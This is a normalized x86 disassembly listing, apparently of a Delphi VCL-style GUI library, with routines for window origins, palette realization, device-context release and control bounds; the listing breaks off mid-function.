mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_4372f0
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_43b858
test eax eax
je r-xdata
mov esi eax
sub_4360a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_414014
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebx ] eax
sub_4360c8
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41430c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403294
xor eax eax
mov [ ebx ] eax
sub_4360e8
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_436118
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_414534
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4361c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414598
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_4361a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_436354
call sub_403ab4
call sub_403ab4
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414170
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41e7a0
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_4361d4
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_414534
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_436272
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436279
mov eax [ rw-data ]
call sub_414598
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43624a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_436354
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41e7fc
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_414170
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41e7a0
test al al
je r-xdata
sub_436280
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_436354
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41e398
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4362ac
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e980
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41e984
mov eax [ ebp - 0x4 ]
call sub_4363a0
mov eax [ rw-data ]
call sub_414534
mov ebx eax
xor eax eax
push ebp
push sub_436331
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_414014
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414598
retn
call sub_436118
sub_436354
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41e984
mov edx ebx
mov eax [ rw-data ]
call sub_414548
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_4363a0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_437e08
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_4363cc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_436408
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414850
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_436450
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43650c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4365d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4365e0
lea eax [ ebp - 0x1c ]
call sub_404050
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403490
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_446804
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408d10
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4040a4
sub_4365fc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_436663
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4438d0
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_4377ac
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov edx [ eax + 0x64 ]
pop eax
call sub_40445c
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43666a
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov al 0x1
sub_436670
push ebx
mov ebx eax
mov eax ebx
call sub_4438f8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4366a4
push ebx
mov ebx eax
mov eax ebx
call sub_443948
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_40445c
je r-xdata
mov al 0x1
pop ebx
retn
sub_4366dc
push ebx
mov ebx eax
mov eax ebx
call sub_443984
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_436710
push ebx
mov ebx eax
mov eax ebx
call sub_41b234
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_436738
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4377dc
sub_436758
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_436778
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_4040a4
sub_43679c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4376cc
sub_4367bc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_4367e8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_40445c
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403444
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43684c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_437128
sub_43686c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_437114
sub_43688c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_4368ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a944
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d7e4
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43785c
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4363cc
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_438738
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_436984
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403608
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_455c2c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035f0
push edi
xor ecx ecx
mov edx 0xb039
call sub_438978
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43714c
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403490
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403294
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403294
mov eax [ edi + 0x68 ]
call sub_403294
mov eax [ edi + 0x64 ]
call sub_408880
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41a990
test bl bl
jle r-xdata
sub_436a50
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_436a78
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403490
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436b00
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_436e00
sub_436b20
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403294
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_439794
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403490
mov edx ebx
mov eax edi
call sub_41aa14
mov eax ebx
mov si 0xffd9
call sub_403490
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_436be8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ada4
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_438978
sub_436c7c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ac60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_437764
jmp r-xdata
xor edx edx
mov eax esi
call sub_436b20
sub_436cc0
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403490
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_436b00
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403490
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_436d68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_438f08
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_437bf4
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_436e00
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_438978
mov eax ebx
mov si 0xffd0
call sub_403490
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403490
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_436e00
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_43e270
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_436f1c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_436f40
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_436f68
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_436f8c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_436fb0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_4370ab
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403490
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4370b2
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41430c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403490
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403490
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_414014
sub_4370bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_437bf4
mov edx edi
mov eax ebx
call sub_43716c
mov edx edi
mov eax ebx
call sub_438a1c
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_437128
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_4040a4
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43716c
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4371c8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_4371f4
mov edx eax
mov ecx esp
mov eax esi
call sub_412ce0
mov edx esp
mov eax ebx
call sub_437638
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43720c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
